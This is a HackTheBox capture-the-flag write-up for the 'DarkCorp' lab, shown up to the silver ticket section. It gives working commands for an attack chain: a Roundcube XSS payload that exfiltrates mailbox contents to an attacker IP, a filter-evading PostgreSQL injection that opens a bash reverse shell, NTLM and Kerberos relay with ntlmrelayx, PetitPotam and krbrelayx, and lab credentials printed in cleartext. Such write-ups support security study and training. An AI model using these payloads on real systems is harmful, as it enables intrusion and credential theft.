---
title: DarkCorp
categories: [HackTheBox]
tags: [nmap, xss, sql-injection, postgresql, ntlm-relay, dnsadmin, kerberos-relay, adcs, silver-ticket, dpapi, shadow-credentials, gpo-abuse, insane]
media_subpath: /images/hackthebox_darkcorp/
image:
  path: 'https://labs.hackthebox.com/storage/avatars/93fba06a4780b65be5a5a4f9512b8e78.png'
---

# DarkCorp

## Summary

**DarkCorp** is an Insane-rated machine that demonstrates a complex multi-stage attack chain involving web application vulnerabilities, Active Directory exploitation, and advanced Kerberos attacks. The initial compromise was achieved through an [XSS vulnerability](/theory/misc/xss) in Roundcube webmail that allowed intercepting password reset links for the `bcase` user. After gaining access to the web application, a [PostgreSQL injection](/theory/misc/sql-injection) with filter evasion techniques was used to obtain a reverse shell. The decrypted backup file revealed domain credentials, enabling pivoting into the Active Directory environment. Through [NTLM relay attacks](/theory/protocols/ntlm#ntlm-relay), the `svc_acc` account was compromised, which had DNSAdmin privileges. This was leveraged to perform a [Kerberos relay attack](/theory/protocols/kerberos#kerberos-relay) using PetitPotam and krbrelayx, obtaining a machine certificate for `WEB-01$`. The machine account hash was used to forge a [Silver Ticket](/theory/protocols/kerberos#silver-tickets) for local Administrator access. [DPAPI secrets extraction](/theory/windows/dpapi) revealed additional credentials, leading to a [Shadow Credentials attack](/theory/windows/shadow-credentials) on `angela.w`. Finally, [Kerberos ENTERPRISE name-type abuse](/theory/protocols/kerberos#enterprise-principals) was used to impersonate `taylor.b.adm`, and [GPO abuse](/theory/windows/gpo) was employed to achieve Domain Admin privileges.

---

## Table of Contents

1. [Initial Enumeration](#initial-enumeration)
2. [Web Exploration on Port 80](#web-exploration-on-port-80)
3. [Discovering the `.env` File & Database Credentials](#discovering-the-env-file--database-credentials)
4. [Password Reset for `bcase` via an XSS Exploit](#password-reset-for-bcase-via-an-xss-exploit)
5. [PostgreSQL Injection & Filter Evasion to Obtain Reverse Shell](#postgresql-injection--filter-evasion-to-obtain-reverse-shell)
6. [Decrypting the `.gpg` Backup & Finding Domain Credentials](#decrypting-the-gpg-backup--finding-domain-credentials)
7. [Pivot into the Domain Environment](#pivot-into-the-domain-environment)
8. [NTLM Relay & Discovery of `svc_acc` as a DNS Admin](#ntlm-relay--discovery-of-svc_acc-as-a-dns-admin)
9. [DNSAdmin to Kerberos Relay with PetitPotam & krbrelayx](#dnsadmin-to-kerberos-relay-with-petitpotam--krbrelayx)
10. [Silver Ticket Attack on `WEB-01` to Get Administrator Access](#silver-ticket-attack-on-web-01-to-get-administrator-access)
11. [Dumping DPAPI Secrets & Obtaining Local Administrator Password](#dumping-dpapi-secrets--obtaining-local-administrator-password)
12. [Password Spray & Finding `john.w` Credentials](#password-spray--finding-johnw-credentials)
13. [Shadow Credentials Attack on `angela.w`](#shadow-credentials-attack-on-angelaw)
14. [Abusing Kerberos Name-Type (ENTERPRISE Principals) to Become `taylor.b.adm`](#abusing-kerberos-name-type-enterprise-principals-to-become-taylorbadm)
15. [Gaining Root on the Linux Host & Extracting Cached Credentials](#gaining-root-on-the-linux-host--extracting-cached-credentials)
16. [Final GPO Abuse for Domain Admin Privileges](#final-gpo-abuse-for-domain-admin-privileges)
17. [Summary of Looted Flags & Access](#summary-of-looted-flags--access)
18. [Additional / Unintended Attack Vectors](#additional--unintended-attack-vectors)

---

## Nmap

We begin with a comprehensive Nmap scan to identify open ports and services:

```bash
nmap -sVC -Pn -oN nmap 10.10.11.54
```

**Command Breakdown:**
- `-sV`: Service version detection
- `-sC`: Default NSE scripts
- `-Pn`: Skip host discovery (treat all hosts as online)
- `-oN nmap`: Output to file in normal format

**Results:**
```
PORT   STATE SERVICE REASON          VERSION
22/tcp open  ssh     syn-ack ttl 127 OpenSSH 9.2p1 Debian ...
80/tcp open  http    syn-ack ttl 127 nginx 1.22.1
| http-title: DripMail
| http-server-header: nginx/1.22.1
...
```

**Analysis:**
- **Port 22 (SSH)**: Standard OpenSSH service running on Debian
- **Port 80 (HTTP)**: Nginx web server hosting "DripMail" application

**Host Configuration:**

Quick tests for enumerating possible DNS resolution

```bash
curl -I 10.129.232.7
HTTP/1.1 200 OK
Server: nginx/1.22.1
Date: Fri, 17 Oct 2025 17:20:31 GMT
Content-Type: text/html
Content-Length: 64
Last-Modified: Wed, 01 Jan 2025 11:32:02 GMT
Connection: keep-alive
ETag: "677527b2-40"
Accept-Ranges: bytes

curl 10.129.232.7
<meta http-equiv="refresh" content="0; url=http://drip.htb/" />
echo '10.129.232.7 drip.htb' | sudo tee -a /etc/hosts
10.129.232.7 drip.htb
```

---

## Web Application Enumeration

Visiting `http://drip.htb/` reveals a landing page referencing *DripMail*. When registering an account, we get redirected to a new domain:
![DripMail Landing Page](Pasted image 20250216210659.png)

```
http://mail.drip.htb/
```

We then add this second domain to our `/etc/hosts` file:
```
10.10.11.54 mail.drip.htb
```

After creating our own user account, it appears the site is built around Roundcube webmail:

![Roundcube Webmail Interface](Pasted image 20250216210723.png)

- The interface is Roundcube (a known webmail software) with some customized features.  
- We receive an email from `support@drip.htb` instructing us to contact them or do something within the web environment.  
![Support Email](Pasted image 20250216210801.png)
- Inspecting message headers or the raw email indicates another domain: `darkcorp.htb`.
![Email Headers Revealing Domain](Pasted image 20250216210848.png)

Thus, we suspect there might be hidden or additional vhosts on the server.  

---

## Information Disclosure - Environment File

A quick directory brute force (e.g., **dirsearch**, **feroxbuster**, or **gobuster**) on `drip.darkcorp.htb` reveals a `.env` file:

```bash
dirsearch -u http://drip.darkcorp.htb -rR 2 -t 100
```

```bash
curl http://drip.darkcorp.htb/dashboard/.env
```

Inside, we find interesting environment variables:

```python
DEBUG=False
FLASK_APP=run.py
FLASK_ENV=development
ASSETS_ROOT=/static/assets

DB_ENGINE=postgresql
DB_HOST=localhost
DB_NAME=dripmail
DB_USERNAME=dripmail_dba
DB_PASS=2Qa2SsBkQvsc
DB_PORT=5432
SECRET_KEY='GCqtvsJ...'

MAIL_SERVER='drip.htb'
MAIL_PORT=25
MAIL_USE_TLS=False
MAIL_USE_SSL=False
```

We see the **PostgreSQL** credentials:
- **Username**: `dripmail_dba`
- **Password**: `2Qa2SsBkQvsc`

Also, it indicates a *Flask* application. The `SECRET_KEY` might be used for session signing.  

Additionally, searching for python files we spot references to a *reset functionality* in the application code (by enumerating source files like `authentication/routes.py`) that show a whitelist for password resets. It specifically mentions a user named **`bcase`**.

![Authentication Routes](Pasted image 20250216211050.png)

![Password Reset Whitelist](Pasted image 20250216211110.png)

---

## XSS Exploitation - Password Reset Interception

### Locating the Reset Mechanism

Inside `authentication/routes.py`, we see that only certain users can be reset (i.e., `'bcase'`). We need to figure out how to trigger that reset and read the link (or token) that goes to `bcase`.

### Getting `bcase's` Reset Link via XSS

![Reset Mechanism Location](Pasted image 20250216211204.png)

We cannot directly read **`bcase`**'s emails. However, we can see the Roundcube instance is running at version v1.6.7.

![Roundcube Version](Pasted image 20250216211323.png)

**Version Analysis:**
Roundcube v1.6.7 is known to have had an **XSS vulnerability** that allows malicious HTML content to be executed when emails are viewed. This vulnerability can be leveraged to steal sensitive information from other users' mailboxes.

**Attack Strategy:**
We can leverage this cross-site scripting bug by sending a malicious email to target `bcase` that will automatically read his emails and forward the content (including reset links) back to us.

![XSS Payload Test](Pasted image 20250216211346.png)

```bash
curl 'http://drip.htb/contact' -X POST \
  -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -H 'Cookie: session=eyJfZnJlc2giOmZhbHNlLCJjc3JmX3Rva2VuIjoiODk4NzI2Mjg2NGRjODk3MjYxMzk0ZjU2ZTI3YjU0ZTAzN2U4MTQ1YyJ9.Z7Hz9Q.NwBZrFcGYuJHuyzI30m13T683c0' \
  --data-raw 'name=test&email=teste%40teste.com&message=test&content=text&recipient=railoca%40drip.htb'
```

**Response:**
```
<!doctype html><html lang="en"> 
<title>Redirecting...</title> 
<h1>Redirecting...</h1> 
<p>You should be redirected automatically to the target URL: 
<a href="index#contact">index#contact</a>. If not, click the link.
```

And we receive the email:

![Email Received](Pasted image 20250216211448.png)

[Roundcube XSS Link](https://www.sonarsource.com/blog/government-emails-at-risk-critical-cross-site-scripting-vulnerability-in-roundcube-webmail/)

**Key steps**:

1. **Confirm Email injection**: By controlling fields in the `/contact` form, we can send an email to *any* domain user, including ourselves to test if it is indeed vulnerable
2. **Inject an XSS payload** that will automatically open each message in `bcase`’s mailbox and then forward the content (including reset links) back to us.

A simplified malicious payload might look like this:

```html
<body title="bgcolor=foo" name='bar style=animation-name:progress-bar-stripes onanimationstart=alert(xss)' foo=bar>
  XSS Test
</body>
```

We send a malicious payload to our email to test the vulnerability:

```bash
curl 'http://drip.htb/contact' -X POST \
  -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -H 'Cookie: session=eyJfZnJlc2giOmZhbHNlLCJjc3JmX3Rva2VuIjoiODk4NzI2Mjg2NGRjODk3MjYxMzk0ZjU2ZTI3YjU0ZTAzN2U4MTQ1YyJ9.Z7Hz9Q.NwBZrFcGYuJHuyzI30m13T683c0' \
  --data-raw 'name=test&email=teste%40teste.com&message=<body title="bgcolor=foo" name="bar style=animation-name:progress-bar-stripes onanimationstart=alert(origin) foo=bar">Foo</body>&content=text&recipient=railoca%40drip.htb'
```

**Response:**
```
<!doctype html><html lang="en"> 
<title>Redirecting...</title> 
<h1>Redirecting...</h1> 
<p>You should be redirected automatically to the target URL: 
<a href="index#contact">index#contact</a>. If not, click the link.
```

![XSS Alert Triggered](Pasted image 20250216211702.png)

Now changing the `content` to `html`:

![HTML Content Type](Pasted image 20250216211720.png)

We now send an email (POST to `/contact`) with `content=html`. Roundcube will render the HTML part of the message if setting the content as `html`. When `bcase` opens it, we harvest all message bodies from his Inbox, including the password reset link.

Crafting the payload to read the emails:
```html
<body title="bgcolor=foo" name="bar style=animation-name:progress-bar-stripes onanimationstart=fetch('/?_task=mail&_mbox=INBOX&_uid=FUZZ&_action=show').then(response=>response.text()).then(data=>fetch(`http://10.10.14.13:8000/?data=${btoa(data)}`)) foo=bar">
  Foo
</body>
```

![Email Reading Payload](Pasted image 20250216211740.png)

Checking each UID we can find a link to reset his password.

![Password Reset Link Found](Pasted image 20250216211832.png)
### Resetting & Logging In

We parse the base64-encoded data that the XSS exfiltrates. We find a special link for resetting `bcase`’s password. We then:

1. Visit the reset URL ourselves (it is a one-time token or link).  
2. Reset `bcase`’s password to a known value.  
![Password Reset Form](Pasted image 20250216211850.png)
3. Log into the dashboard as `bcase`.

![Logged in as bcase](Pasted image 20250216211901.png)

---

## SQL Injection - PostgreSQL RCE

After logging in as `bcase`, we discover that some portion of the application allows us to run queries or do certain *admin-like* tasks. Alternatively, we might see references to SQL queries in the web interface. A typical path in these situations is to test for **SQL Injection** on parameters used in the web interface that references the *PostgreSQL* database.

![SQL Injection Interface](Pasted image 20250216211926.png)

**Filter Evasion Challenges**:
- Certain keywords like `UNION`, `COPY`, etc., might be filtered by the application
- We can bypass these filters using *PostgreSQL's* `DO $$ ... $$;` blocks and **CHR()** obfuscation to piece together commands

**Advanced SQL Injection Payload:**

```sql
''; DO $$ 
BEGIN 
    EXECUTE (
       CHR(67)||CHR(79)||CHR(80)||CHR(89)||' (SELECT '''') TO PROGRAM ''bash -c "bash -i >& /dev/tcp/10.10.14.13/9999 0>&1"'''
    ); 
END 
$$; --
```

**Payload Breakdown:**
- `'';` - Closes the original string and terminates the statement
- `DO $$ ... $$;` - PostgreSQL anonymous code block that allows dynamic SQL execution
- `CHR(67)||CHR(79)||CHR(80)||CHR(89)` - Obfuscated way to spell "COPY" using ASCII character codes
- `EXECUTE` - Dynamically executes the constructed SQL command
- `COPY ... TO PROGRAM` - PostgreSQL feature that allows executing system commands
- `--` - SQL comment to ignore any trailing characters

**How It Works:**
1. The payload bypasses keyword filters by using CHR() functions instead of literal strings
2. The DO block allows us to execute dynamic SQL that wouldn't be possible in a regular query
3. COPY TO PROGRAM is a powerful PostgreSQL feature that can execute shell commands
4. We catch the reverse shell with `nc -lvp 9999` on our attacking machine

![Reverse Shell Obtained](Pasted image 20250216212013.png)
### Gaining Shell as `postgres` or Application User

Once the payload executes, we get a shell on the *DripMail* host. Usually, it runs as the system user for PostgreSQL or the webapp user. We can further enumerate the local filesystem.

---

## Credential Recovery - GPG Decryption

Inside `/backups/postgres`, we see an encrypted `.gpg` file. Also, the `.env` indicated the password we used for the database might be relevant. Indeed, we try:

![GPG Backup File](Pasted image 20250216212035.png)

```bash
gpg --batch --yes --passphrase "2Qa2SsBkQvsc" --decrypt backup.sql.gpg > backup.sql
```

Inside the decrypted SQL, we discover **hashes** or possibly credentials. After cracking them (using, e.g., `hashcat` or `john`), we get a pair of domain credentials. For instance, we find that *`victor.r`* and `ebelford` has a password:

```
victor.r : victor1gustavo@#
ebelford : ThePlague61780
```

![Cracked Credentials](Pasted image 20250216212148.png)

With `ebelford`'s password we can SSH into the `drip` host

![SSH Access as ebelford](Pasted image 20250216212244.png)

---

## Network Pivoting - Domain Environment Access

We now have a shell on the Linux host (`drip` machine), with knowledge that the domain controller might be at `172.16.20.1` or similar internal IP. Checking `ip a`:

```
eth0: inet 172.16.20.3/24 ...
```

![Network Interface](Pasted image 20250216212307.png)

We see a local interface with a `172.16.20.x` address. Checking `/etc/hosts` we confirm:

![Hosts File](Pasted image 20250216212335.png)

Enumerating the internal network using a ping sweep for other hosts we can find another host on the network

```bash
for i in $(seq 1 255);do ping -W 1 -c1 "172.16.20.$i"|grep from;done
```

![Network Discovery](Pasted image 20250216212416.png)

We confirm we can ping these addresses from `drip`. Next, we set up a **tunnel** from our attacker machine to the internal network. Tools like [Ligolo-ng](https://github.com/sysdream/ligolo-ng) or classic SSH local/remote port forwarding (depending on which shell privileges we have) can be used.

![Tunnel Setup](Pasted image 20250216212510.png)

Once we have traffic inside the domain, enumerating with `nmap -sT -Pn 172.16.20.1` shows typical **Windows AD** ports (Kerberos, LDAP, SMB, WinRM, etc.). On `172.16.20.2` we see additional ports (80, 445, 5000, 5985, etc.), which might be an IIS or .NET service.

```
➜  Darkcorp nmap -sT -Pn -oN host_1 -T4 -Pn 172.16.20.1
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-16 15:13 EST
Stats: 0:00:00 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 0.50% done
Nmap scan report for 172.16.20.1
Host is up (0.26s latency).
Not shown: 984 filtered tcp ports (no-response)
PORT     STATE SERVICE
22/tcp   open  ssh
53/tcp   open  domain
80/tcp   open  http
88/tcp   open  kerberos-sec
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
389/tcp  open  ldap
443/tcp  open  https
445/tcp  open  microsoft-ds
464/tcp  open  kpasswd5
593/tcp  open  http-rpc-epmap
636/tcp  open  ldapssl
2179/tcp open  vmrdp
3268/tcp open  globalcatLDAP
3269/tcp open  globalcatLDAPssl
5985/tcp open  wsman
``` 

```
➜  Darkcorp nmap -sT -Pn -oN host_2 -T4 -Pn 172.16.20.2
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-16 15:13 EST
Nmap scan report for 172.16.20.2
Host is up (0.53s latency).
Not shown: 994 closed tcp ports (conn-refused)
PORT     STATE SERVICE
80/tcp   open  http
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
5000/tcp open  upnp
5985/tcp open  wsman

Nmap done: 1 IP address (1 host up) scanned in 43.20 seconds
```

Using **`victor.r:victor1gustavo@#`** we confirm domain membership by trying:

```bash
smbclient -L 172.16.20.1 -U 'victor.r%victor1gustavo@#'
```

We can also verify with CrackMapExec, `nxc`, or `impacket` tools:

```bash
nxc smb 172.16.20.1 -u victor.r -p 'victor1gustavo@#'
```

```
➜  Darkcorp nxc smb 172.16.20.{1,2} -u victor.r -p 'victor1gustavo@#'
SMB         172.16.20.1     445    DC-01            [*] Windows Server 2022 Build 20348 x64 (name:DC-01) (domain:darkcorp.htb) (signing:True) (SMBv1:False)
SMB         172.16.20.1     445    DC-01            [+] darkcorp.htb\victor.r:victor1gustavo@#
SMB         172.16.20.2     445    WEB-01           [*] Windows Server 2022 Build 20348 x64 (name:WEB-01) (domain:darkcorp.htb) (signing:False) (SMBv1:False)
SMB         172.16.20.2     445    WEB-01           [+] darkcorp.htb\victor.r:victor1gustavo@#
Running nxc against 2 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00
```
We see we are indeed a valid domain user.

![Domain Authentication](Pasted image 20250216212644.png)

Once again, we add this entries to our `/etc/hosts` 

![Hosts Configuration](Pasted image 20250216212725.png)

---

## NTLM Relay Attack - DNSAdmin Compromise

Looking deeper, we see that `172.16.20.2` has a web service on port **5000** requiring NTLM authentication. If we try to make HTTP requests to that service, the server responds with `WWW-Authenticate: NTLM` headers. This hints that if we can coerce that service to authenticate somewhere else, we might perform an **NTLM Relay**.

> **OBS:** When capturing the traffic with Burpsuite, it will start to error out, because by default proxies are not configured to use NTLM authentication. To be able to capture the request, we have to configure the account to be able to connect via NTLM

![NTLM Authentication](Pasted image 20250216212904.png)

We can then capture the requests

### Setting Up NTLM Relay

**NTLM Relay Attack Overview:**
NTLM relay attacks exploit the fact that NTLM authentication doesn't verify the target server. We can intercept NTLM authentication attempts and relay them to a different service, effectively impersonating the authenticating user.

**Attack Setup:**
Typically, we use `ntlmrelayx.py` from Impacket. The attack works as follows:
- We configure a relay server listening for inbound NTLM connections
- We forward intercepted NTLM authentication to an LDAP target (`ldap://172.16.20.1`)
- When a service authenticates to our relay, we pass those credentials to LDAP on the domain controller
- This grants us the privileges of the authenticating user in Active Directory

**Why This Works:**
- NTLM doesn't provide server authentication, only client authentication
- Many services use NTLM for authentication without additional protections
- LDAP accepts NTLM authentication and grants AD privileges based on the authenticated user

> **⚠️ Warning:** NTLM relay attacks are a significant security risk in Active Directory environments. Enable SMB signing and LDAP channel binding to prevent these attacks.

We see the account that eventually authenticates is **`svc_acc`**, which is a member of `DnsAdmins`. We see that by enumerating inside the interactive shell offered by `ntlmrelayx.py`. Once the relay is successful:

```bash
ntlmrelayx.py -t ldap://172.16.20.1 --interactive
```

We then forcibly trigger the web service on `172.16.20.2:5000` to connect to our relay by hitting some internal route. For example:

```bash
curl --ntlm -u 'victor.r:victor1gustavo@#' \
  -X POST http://172.16.20.2:5000/status \
  -H 'Content-Type: application/json' \
  --data '{"protocol":"http","host":"drip.darkcorp.htb","port":"8282"}'
```

(Where `drip.darkcorp.htb:8282` is a port on the linux machine that points to our relay machine.)

![NTLM Relay Trigger](Pasted image 20250216213051.png)

When the service attempts to check that URL, it attempts an NTLM handshake to our relay, providing the `svc_acc` account. We relay it onto `LDAP://172.16.20.1`. Bingo: we are `svc_acc`.

```
➜  Darkcorp ntlmrelayx.py -t 'ldap://172.16.20.1' --interactive
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[*] Protocol Client MSSQL loaded..
[*] Protocol Client SMB loaded..
[*] Protocol Client DCSYNC loaded..
[*] Protocol Client LDAPS loaded..
[*] Protocol Client LDAP loaded..
[*] Protocol Client HTTP loaded..
[*] Protocol Client HTTPS loaded..
[*] Protocol Client IMAPS loaded..
[*] Protocol Client IMAP loaded..
[*] Protocol Client SMTP loaded..
[*] Protocol Client RPC loaded..
[*] Running in relay mode to single host
[*] Setting up SMB Server on port 445
[*] Setting up HTTP Server on port 80
[*] Setting up WCF Server on port 9389
[*] Setting up RAW Server on port 6666
[*] Multirelay disabled

[*] Servers started, waiting for connections
```

- Send connection

```
➜  Darkcorp curl --ntlm -u 'victor.r:victor1gustavo@#' 'http://172.16.20.2:5000/status' -X POST  -H 'Content-Type: application/json' --data-raw '{"protocol":"http","host":"drip.darkcorp.htb","port":"8282"}'
{"message":"http://drip.darkcorp.htb:8282 is down (HTTP 401)","status":"Error!"}
```

- And we can get an LDAP shell

```
[*] HTTPD(80): Client requested path: /
[*] HTTPD(80): Client requested path: /
[*] HTTPD(80): Client requested path: /
[*] HTTPD(80): Connection from 127.0.0.1 controlled, attacking target ldap://172.16.20.1
[*] HTTPD(80): Client requested path: /
[*] HTTPD(80): Authenticating against ldap://172.16.20.1 as DARKCORP/SVC_ACC SUCCEED
[*] Started interactive Ldap shell via TCP on 127.0.0.1:11000 as DARKCORP/SVC_ACC
```

- Enumerate who is connected and groups

```
➜  Darkcorp nc 127.0.0.1 11000
Type help for list of commands

# help

 add_computer computer [password] [nospns] - Adds a new computer to the domain with the specified password. If nospns is specified, computer will be created with only a single necessary HOST SPN. Requires LDAPS.
 rename_computer current_name new_name - Sets the SAMAccountName attribute on a computer object to a new value.
 add_user new_user [parent] - Creates a new user.
 add_user_to_group user group - Adds a user to a group.
 change_password user [password] - Attempt to change a given user's password. Requires LDAPS.
 clear_rbcd target - Clear the resource based constrained delegation configuration information.
 disable_account user - Disable the user's account.
 enable_account user - Enable the user's account.
 dump - Dumps the domain.
 search query [attributes,] - Search users and groups by name, distinguishedName and sAMAccountName.
 get_user_groups user - Retrieves all groups this user is a member of.
 get_group_users group - Retrieves all members of a group.
 get_laps_password computer - Retrieves the LAPS passwords associated with a given computer (sAMAccountName).
 grant_control target grantee - Grant full control of a given target object (sAMAccountName) to the grantee (sAMAccountName).
 set_dontreqpreauth user true/false - Set the don't require pre-authentication flag to true or false.
 set_rbcd target grantee - Grant the grantee (sAMAccountName) the ability to perform RBCD to the target (sAMAccountName).
 start_tls - Send a StartTLS command to upgrade from LDAP to LDAPS. Use this to bypass channel binding for operations necessitating an encrypted channel.
 write_gpo_dacl user gpoSID - Write a full control ACE to the gpo for the given user. The gpoSID must be entered surrounding by {}.
 whoami - get connected user
 dirsync - Dirsync requested attributes
 exit - Terminates this session.

# whoami
u:darkcorp\svc_acc

# get_user_groups svc_acc
CN=DnsAdmins,CN=Users,DC=darkcorp,DC=htb
```
### Checking Group Membership

Inside the interactive shell from `ntlmrelayx`, we can type:

```
whoami
get_user_groups svc_acc
```

We see:

```
u:darkcorp\svc_acc
CN=DnsAdmins,CN=Users,DC=darkcorp,DC=htb
```

Hence, `svc_acc` is a member of **DnsAdmins**.  

---

## Kerberos Relay Attack - Machine Certificate Theft

**DnsAdmins** can add or modify DNS records in Active Directory. This is frequently used to facilitate further relay or cross-protocol attacks.

### Understanding the Kerberos Relay Attack
REFERENCE: https://www.synacktiv.com/publications/relaying-kerberos-over-smb-using-krbrelayx

**Attack Objective:**
We want to coerce the `WEB-01` machine account to authenticate to us so we can perform an **ADCS** (Active Directory Certificate Services) certificate enrollment in the machine's name.

**Attack Chain:**
1. **DNS Record Manipulation** - Create a malicious DNS entry that references the machine name plus a "special DNS name" that will trigger the machine to query our server
2. **Machine Authentication Coercion** - Use **PetitPotam** or other MS-EFSRPC "coercion" techniques to force the machine to connect to our listener
3. **Kerberos Relay** - Run **krbrelayx** with `--adcs` to relay the incoming machine Kerberos authentication to the domain's certificate authority (CA)
4. **Certificate Theft** - Request a certificate for `WEB-01$` that we can convert to a `.pfx` and extract an NT Hash from it

**Why This Works:**
- **DnsAdmins** privileges allow us to add DNS records that machines will trust
- Machine accounts automatically authenticate to services they need to access
- ADCS accepts machine account authentication for certificate enrollment
- Machine certificates can be converted to NT hashes for further attacks

**Attack Flow:**
DnsAdmins → add malicious DNS record → machine queries our server → we relay Kerberos auth → we get machine certificate → we extract NT hash

> **💡 Tip:** DNSAdmin privileges are extremely powerful in Active Directory environments. Regularly audit DNSAdmin group membership and monitor for unusual DNS record changes.

### Creating the DNS Entry

Using `ntlmrelayx.py` again (or a separate script that can add DNS records) while still running as `svc_acc`:

```bash
➜  Darkcorp ntlmrelayx.py -t 'ldap://172.16.20.1' --add-dns-record 'dc-011UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA' 10.10.14.13
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[*] Protocol Client MSSQL loaded..
[*] Protocol Client SMB loaded..
[*] Protocol Client DCSYNC loaded..
[*] Protocol Client LDAP loaded..
[*] Protocol Client LDAPS loaded..
[*] Protocol Client HTTP loaded..
[*] Protocol Client HTTPS loaded..
[*] Protocol Client IMAP loaded..
[*] Protocol Client IMAPS loaded..
[*] Protocol Client SMTP loaded..
[*] Protocol Client RPC loaded..
[*] Running in relay mode to single host
[*] Setting up SMB Server on port 445
[*] Setting up HTTP Server on port 80
[*] Setting up WCF Server on port 9389
[*] Setting up RAW Server on port 6666
[*] Multirelay disabled

[*] Servers started, waiting for connections
[*] HTTPD(80): Client requested path: /
[*] HTTPD(80): Client requested path: /
[*] HTTPD(80): Client requested path: /
[*] HTTPD(80): Connection from 127.0.0.1 controlled, attacking target ldap://172.16.20.1
[*] HTTPD(80): Client requested path: /
[*] HTTPD(80): Authenticating against ldap://172.16.20.1 as DARKCORP/SVC_ACC SUCCEED
[*] Enumerating relayed user's privileges. This may take a while on large domains
[*] Checking if domain already has a `dc-011UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA` DNS record
[*] Domain does not have a `dc-011UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA` record!
[*] Adding `A` record `dc-011UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA` pointing to `10.10.14.13` at `DC=dc-011UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA,DC=darkcorp.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=darkcorp,DC=htb`
[*] Added `A` record `dc-011UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA`. DON'T FORGET TO CLEANUP (set `dNSTombstoned` to `TRUE`, set `dnsRecord` to a NULL byte)
[*] Dumping domain info for first time
[*] Domain info dumped into lootdir!
```

![DNS Record Added](Pasted image 20250216213336.png)

(One can encode a malicious subdomain. In some references, you see *marshaled strings* or glitchy naming so the machine tries to do a reverse DNS lookup that triggers an SMB or HTTP connection.)

### Coercing the Connection with PetitPotam

To force `WEB-01$` to authenticate to our relay server, we use a tool like:

```bash
➜  PetitPotam git:(main) /home/mh1lux5/.local/share/pipx/venvs/impacket/bin/python ./PetitPotam.py -u victor.r -p 'victor1gustavo@#' -d darkcorp.htb 'dc-011UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA' web-01
/opt/PetitPotam/./PetitPotam.py:20: SyntaxWarning: invalid escape sequence '\ '
  show_banner = '''


              ___            _        _      _        ___            _
             | _ \   ___    | |_     (_)    | |_     | _ \   ___    | |_    __ _    _ __
             |  _/  / -_)   |  _|    | |    |  _|    |  _/  / _ \   |  _|  / _` |  | '  \
            _|_|_   \___|   _\__|   _|_|_   _\__|   _|_|_   \___/   _\__|  \__,_|  |_|_|_|
          _| """ |_|"""""|_|"""""|_|"""""|_|"""""|_| """ |_|"""""|_|"""""|_|"""""|_|"""""|
          "`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'

              PoC to elicit machine account authentication via some MS-EFSRPC functions
                                      by topotam (@topotam77)

                     Inspired by @tifkin_ & @elad_shamir previous work on MS-RPRN



Trying pipe lsarpc
[-] Connecting to ncacn_np:web-01[\PIPE\lsarpc]
[+] Connected!
[+] Binding to c681d488-d850-11d0-8c52-00c04fd90f7e
[+] Successfully bound!
[-] Sending EfsRpcOpenFileRaw!
[-] Got RPC_ACCESS_DENIED!! EfsRpcOpenFileRaw is probably PATCHED!
[+] OK! Using unpatched function!
[-] Sending EfsRpcEncryptFileSrv!
[+] Got expected ERROR_BAD_NETPATH exception!!
[+] Attack worked!
```

![PetitPotam Execution](Pasted image 20250216213456.png)

This sends an MS-EFSRPC call that “coerces” the target machine to connect to our chosen server. Our waiting instance of **krbrelayx** intercepts it:

```bash
➜  Darkcorp /home/mh1lux5/.local/share/pipx/venvs/impacket/bin/python /opt/krbrelayx/krbrelayx.py --adcs -v 'WEB-01$' -t 'https://dc-01.darkcorp.htb/certsrv/certfnsh.asp'
[*] Protocol Client SMB loaded..
[*] Protocol Client LDAPS loaded..
[*] Protocol Client LDAP loaded..
[*] Protocol Client HTTP loaded..
[*] Protocol Client HTTPS loaded..
[*] Running in attack mode to single host
[*] Running in kerberos relay mode because no credentials were specified.
[*] Setting up SMB Server
[*] Setting up HTTP Server on port 80
[*] Setting up DNS Server
```

![krbrelayx Running](Pasted image 20250216213508.png)

When the machine attempts to get a legitimate resource, we intercept the Kerberos handshake and request a certificate from the domain’s CA for the `WEB-01$` account.

### Obtaining the Machine .pfx & NT Hash

krbrelayx will output:

```
[*] GOT CERTIFICATE! ID 5
[*] Writing PKCS#12 certificate to ./WEB-01$.pfx
```

From here, we can run **Certipy** or **GetTGTpkinit**:

```bash
certipy auth -pfx ./WEB-01$.pfx
```

![Certificate Obtained](Pasted image 20250216213528.png)

---

## Silver Ticket Attack - Local Administrator Access

**Silver Ticket Attack Overview:**
Having the **machine account NT hash** for `WEB-01$`, we can forge a **Silver Ticket** that effectively grants us local Administrator on that host.

**What is a Silver Ticket?**
A Silver Ticket is a forged Kerberos service ticket that allows us to authenticate to a specific service (like CIFS/SMB) on a target machine. Unlike Golden Tickets, Silver Tickets are limited to specific services but don't require domain controller access to create.

**Why This Works:**
- Machine accounts have the ability to create service tickets for services running on their host
- The machine account NT hash can be used to forge tickets for any service on that machine
- Silver Tickets bypass normal Kerberos authentication and appear as legitimate service tickets

